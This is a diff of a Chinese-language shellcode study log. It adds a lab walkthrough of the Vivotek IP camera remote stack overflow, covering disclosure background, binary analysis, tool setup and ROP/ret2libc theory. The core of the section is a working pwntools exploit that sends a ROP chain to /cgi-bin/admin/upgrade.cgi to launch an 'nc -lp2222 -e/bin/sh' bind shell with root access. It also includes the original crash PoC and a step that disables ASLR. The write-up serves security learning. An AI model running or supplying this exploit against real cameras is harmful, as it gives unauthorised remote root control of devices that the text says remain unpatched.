@@ -1,8 +1,12 @@
+[TOC]
+
 # shellcode_learning
+
 这个日志记录了学习shellcode过程和在学习过程中遇到的问题。<br><br>
 主要参考了蒸米的一步一步学ROP，修改了作者的部分错误和参考了一些其他博客。<br><br>
 
 ## 配置环境
+-------------------
 操作系统：ubuntu16.04 LTS 64位系统（建议不使用ubuntu18,可能使用了更加复杂的地址保护机制，容易导致实验失败）<br>
 编译工具：
 1. python2 <br>
@@ -255,6 +259,162 @@ $ whoami<br>
 [用户名] <br><br>
 
 
+[TOC]
+
+漏洞介绍
+============
+
+Vivotek IP Cameras - Remote Stack Overflow
+-------------------
+>   &ensp;&ensp;&ensp;&ensp;Vivotek 旗下多款摄像头被曝出远程未授权栈溢出漏洞，攻击者发送特定数据可导致摄像头进程崩溃。
+
+>   &ensp;&ensp;&ensp;&ensp;漏洞作者@bashis 放出了可造成摄像头 Crash 的PoC：
+>   &ensp;&ensp;&ensp;&ensp;https://www.seebug.org/vuldb/ssvid-96866
+
+>   &ensp;&ensp;&ensp;&ensp;该漏洞在 Vivotek 的摄像头中广泛存在，按照官方的安全公告，会影响以下版本：
+>   &ensp;&ensp;&ensp;&ensp;CC8160 CC8370-HV CC8371-HV CD8371-HNTV CD8371-HNVF2 FD8166A FD8166A-N FD8167A FD8167A-S FD8169A FD8169A-S FD816BA-HF2 FD816BA-HT FD816CA-HF2 FD8177-H FD8179-H FD8182-F1 FD8182-F2 FD8182-T FD8366-V FD8367A-V FD8369A-V FD836BA-EHTV FD836BA-EHVF2 FD836BA-HTV FD836BA-HVF2 FD8377-HV FD8379-HV FD8382-ETV FD8382-EVF2 FD8382-TV FD8382-VF2 FD9171-HT FD9181-HT FD9371-EHTV FD9371-HTV FD9381-EHTV FD9381-HTV FE8182 FE9181-H FE9182-H FE9191 FE9381-EHV FE9382-EHV FE9391-EV IB8360 IB8360-W IB8367A IB8369A IB836BA-EHF3 IB836BA-EHT IB836BA-HF3 IB836BA-HT IB8377-H IB8379-H IB8382-EF3 IB8382-ET IB8382-F3 IB8382-T IB9371-EHT IB9371-HT IB9381-EHT IB9381-HT IP8160 IP8160-W IP8166 IP9171-HP IP9181-H IZ9361-EH MD8563-EHF2 MD8563-EHF4 MD8563-HF2 MD8563-HF4 MD8564-EH MD8565-N SD9161-H SD9361-EHL SD9362-EH SD9362-EHL SD9363-EHL SD9364-EH SD9364-EHL SD9365-EHL SD9366-EH SD9366-EHL VS8100-V2
+
+>   &ensp;&ensp;&ensp;&ensp;Vivotek 官方提供了各种型号摄像头的固件下载：http://www.vivotek.com/firmware/ ，通过官网我们可以发现在官网固件下载页面中的大多数固件均早于漏洞曝出时间。通过对几款摄像头的最新固件进行验证，发现漏洞依然存在，这意味着截止漏洞被曝出，Vivotek 官方对该漏洞的修复并不彻底。但这也给了我们研究和利用漏洞的机会。
+
+
+
+时间线
+-------------------
+
+>   &ensp;&ensp;&ensp;&ensp;October 1, 2017: Reported findings with all details to Vivotek Cybersecurity
+>   &ensp;&ensp;&ensp;&ensp;October 2, 2017: First response from Vivotek
+>   &ensp;&ensp;&ensp;&ensp;October 5, 2017: ACK of findings from Vivotek
+>   &ensp;&ensp;&ensp;&ensp;October 11, 2017: Vivotek reported first fixed Firmware
+>   &ensp;&ensp;&ensp;&ensp;October 12, 2017: After request, Vivotek provided samples of fixed Firmware
+>   &ensp;&ensp;&ensp;&ensp;October 17, 2017: Verified fixed Firmware, Vivotek thanking for the help
+>   &ensp;&ensp;&ensp;&ensp;October 30, 2017: Noticed new Firmware released, pinged to get some info about their advisory
+>   &ensp;&ensp;&ensp;&ensp;November 1, 2017: Agreed on publication November 13, 2017
+>   &ensp;&ensp;&ensp;&ensp;November 9, 2017: Checked few release notes, none mention security fix; pinged Vivotek with the question why not.
+>   &ensp;&ensp;&ensp;&ensp;November 13, 2017: No reply from Vivotek, Full Disclosure as planned.
+
+攻击步骤
+-------------------
+>   &ensp;&ensp;&ensp;&ensp;栈溢出会被'PUT'或者'POST'请求所触发。具体的触发格式为
+>   1."[PUT|POST]Content-Length:[20 bytes garbage]BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"（本文采用的是这种格式）
+>   2."[PUT|POST][JUNK]Content-Length[JUNK]:[20 bytesgarbage]BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"
+>   &ensp;&ensp;&ensp;&ensp;注意：Good bytes是指 0x01-0x09, 0x0b-0xff; Bad bytes是指0x00, 0x0a;bad bytes在会被截断，导致shellcode构造失败！
+
+二进制文件分析
+============
+httpd
+-------------------
+>用tftp将/usr/sbin/httpd,传送到主机后用file命令查看文件属性，结果可知目标架构为 ARM、小端、32位。且该 ELF 文件为动态链接
+![](http://10.10.2.24:8181/uploads/201901/security/attach_157677889656679a.png)
+
+安全机制
+-------------------
+> 开启了 NX 保护，这意味着我们无法在栈上部署 shellcode
+![](http://10.10.2.24:8181/uploads/201901/security/attach_15767aa0140c29f9.png)
+
+编译环境与攻击工具
+============
+
+gdbserver+gdb
+-------------------
+>   &ensp;&ensp;&ensp;&ensp; 在二进制文件分析中得知目标架构为 ARM、小端、32位。且该 ELF 文件为动态链接。因此决定采用gdbserver-7.7.1-armel-eabi5-v1-sysv 可在链接中获取： https://github.com/mzpqnxow/gdb-static-cross/tree/master/prebuilt-static ，下载后可以用telnet登录摄像头，使用tftp安装到摄像头中。
+>   &ensp;&ensp;&ensp;&ensp;由于gdbserver是7.7.1版本的，因此需要适配的gdb版本（非常重要！否则会导致gdb无法调试等许多问题）gdb可以在官网中找到合适的版本 ftp://ftp.gnu.org/gnu/gdb 
+>   具体的编译步骤如下：
+>   1.tar zxvf gdb-7.11.1-tar-bz2
+>   2.cd gdb-7.11.1
+>   3../configure --target=arm-linux --prefix=/usr/local/arm-gdb – v 然后更改配置vi /etc/profile 在末尾添加 export PATH=$PATH:/usr/local/arm-gdb/bin ，这样可以找到路径
+>   4.make
+>   5.make install完成gdb的安装
+
+pwn
+-------------------
+>   &ensp;&ensp;&ensp;&ensp;pwntools是一个CTF框架和漏洞利用开发库，用Python开发，由rapid设计，旨在让使用者简单快速的编写exploit。pwntools对Ubuntu 12.04和14.04的支持最好，但是绝大多数的功能也支持Debian, Arch, FreeBSD, OSX, 等等。
+> 首先安装Capstone：
+> 1.git clone https://github.com/aquynh/capstone
+> 2.cd capstone
+> 3.make
+> 4.make install
+> 然后安装pwntools:
+> 1.pip install pwntools
+> 官方文档：http://docs.pwntools.com/en/stable/
+
+ROPgadget
+-------------------
+> ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。使用ROPgadget可以帮助我们快速获取可使用的gadget。
+> 1.git clone https://github.com/JonathanSalwan/ROPgadget.git
+> 2.cd ROPgadget
+> 3.sudo python setup.py install
+
+漏洞利用
+============
+DEP
+-------------------
+> 数据执行保护DEP（Data Execute Prevention）技术可以限制内存堆栈区的代码为不可执行状态，从而防范溢出后代码的执行。对于缓冲区溢出攻击，攻击者能够对内存的堆栈或堆的缓冲区进行覆盖操作，并执行写入shellcode代码。启用DEP后，这些敏感区域设置为不可执行的no-executable标志位，因此即使溢出后跳转到恶意代码的地址，也无法被执行，从而阻止了缓冲区溢出攻击。
+
+return2libc原理
+-------------------
+>既然注入Shellcode无法执行，进程和动态库的代码段怎么也要执行吧，具有可执行属性，那攻击者能否利用进程空间现有的代码段进行攻击，答案是肯定的。
+
+>在系统函数库（Linux称为glibc）有个system函数，它就是通过/bin/sh命令去执行一个用户执行命令或者脚本，我们完全可以利用system来实现Shellcode的功能。EIP一旦改写成system函数地址后，那执行system函数时，它需要获取参数。而根据Linux X86 32位函数调用约定，参数是压到栈上的。因为栈空间完全由我们控制了，所以控制system的函数不是一件难事情。
+>这种攻击方法称之为ret2libc，即return-to-libc，返回到系统库函数执行 的攻击方法
+
+ROP原理
+-------------------
+> 顾名思义ROP，就是面向返回语句的编程方法，它借用libc代码段里面的多个retq前的一段指令拼凑成一段有效的逻辑，从而达到攻击的目标。为什么是retq，因为retq指令返到哪里执行，由栈上的内容决定，而这是攻击者很容易控制的地址。那参数如何控制，就是利用retq执行前的pop reg指令，将栈上的内容弹到指令的寄存器上，来达到预期。一段retq指令未必能完全到想攻击目标的前提条件，那可在栈上控制retq指令跳到另一段retq指令表，如果它还达不到目标，再跳到另一段retq，直到攻击目标实现。
+
+
+漏洞利用细节
+-------------------
+> 根据漏洞作者 @bashis 提供的 PoC
+echo -en "POST /cgi-bin/admin/upgrade.cgi 
+HTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"  | ncat -v 192.168.14.75 80
+![](http://10.10.2.24:8181/uploads/201901/security/attach_15767a0636df38b2.png)
+> 利用pwn对httpd分析可以得到httpd开启了 NX 保护，这代表着无法在栈上部署 shellcode，因此我们采用了return2libc的方法。
+![](http://10.10.2.24:8181/uploads/201901/security/attach_15763c8c0892d6c6.png)
+> 在摄像头上cat /proc/sys/kernel/randomize_va_space 结果为2，说明开启了ASLR保护，我们首先echo 0 > /proc/sys/kernel/randomize_va_space暂时关闭ASLR保护后，就可以正式开始利用漏洞了。
+
+>1.查找libC 库的加载地址：
+> 我们可以在进程找到httpd的pid，查看/proc/[pid]/maps 找到libc的加载地址
+![](http://10.10.2.24:8181/uploads/201901/security/attach_15763d266f9530d0.png)
+>2.根据前面的PoC可以得到X占据了esp的位置，因此只要构造 0x38 - 4 字节以上的数据，栈底的函数返回地址就会被劫持。并且发现崩溃时 SP 寄存器的地址为0xbeffea60。而此时，我们想调用的是system函数。system() 函数地址 = libC 库在内存中的加载基址 + system() 函数在 libC 库中的偏移，通过劫持该地址为 libC 库中的 system() 函数地址，再设置 R0 寄存器指向命令字符串，就可以执行任意命令。
+>3.验证nc 命令可以正常使用：
+>在摄像头上执行nc -lp2222 -e/bin/sh，在主机上执行nc 192.168.14.75 2222 发现摄像头支持nc指令，因此我们可以把字符串参数 "nc -lp2222 -e/bin/sh"部署到栈上，并且将地址存入 R0
+>4.寻找gadget:
+使用ROPgadget寻找gadgets
+![](http://10.10.2.24:8181/uploads/201901/security/attach_15763e74a81a92ee.png)
+得到了0x00033100 : pop {r0, pc}
+>但是却不能使用，因为0xb6f2b000+0x00033100 = B6F5E100出现了坏字符0x00，会在发送时被截断，因此需要采用迂回的方法得到合适的gadgets，最终选择了
+> 0x00048784 : pop {r1, pc} 
+> 0x00016aa4 : mov r0, r1 ; pop {r4, r5, pc}
+>得到上述所有信息后我们可以开始攻击脚本的编写：
+
+```python
+# -*- coding: UTF-8 -*-
+#!/usr/bin/python
+
+from pwn import *
+import os
+p = remote('192.168.14.75',80)
+libc_base = 0xb6f2b000    # libC 库在内存中的加载地址
+stack_base = 0xbeffea60 # 崩溃时 SP 寄存器的地址
+libc_elf = ELF('libuClibc-0.9.33.3-git.so')
+
+payload = (0x38 - 4) * 'a' # padding
+payload +=  p32(0x00048784 + libc_base) # gadget1
+payload += p32(0x80 + stack_base) # 栈中命令参数地址
+payload += p32(0x00016aa4 + libc_base) # gadget2
+payload += (0x8 * 'a')  # padding
+payload += p32(libc_elf.symbols['system'] + libc_base) # 内存中 system() 函数地址
+payload += ('pwd;' * 0x100 + 'nc\x20-lp2222\x20-e/bin/sh\x20>') # 命令参数
+payload = "POST /cgi-bin/admin/upgrade.cgi \nHTTP/1.0\nContent-Length:{}\n\r\n\r\n".format(payload)
+p.send(payload)
+``` 
+>在ARM 架构中，会优先通过寄存器传递参数，如果参数个数超过了寄存器的数量，则将剩下的参数压入调用参数空间（即堆栈），即sp寄存器
+> 为了确保命令能执行，我们在真正要执行的命令前加了部分命令作为缓冲。这里用了'pwd;' * 0x100，后来我试验发现* 0x120 ，* 0x80 都行，这里并不需要一个具体的数字，只是希望能够把'nc\x20-lp2222\x20-e/bin/sh\x20>'压入堆栈中，但是这个'pwd;'中的';'非常重要，截断shell，否则不能运行
+在主机上运行nc 192.168.14.75 2222即可获取root权限
+>下图为攻击的大概流程
+![](http://10.10.2.24:8181/uploads/201901/security/attach_15764f099af8e553.png)
+>下图为攻击的结果
+![](http://10.10.2.24:8181/uploads/201901/security/attach_1576443e948bab3e.png)
 
 
 
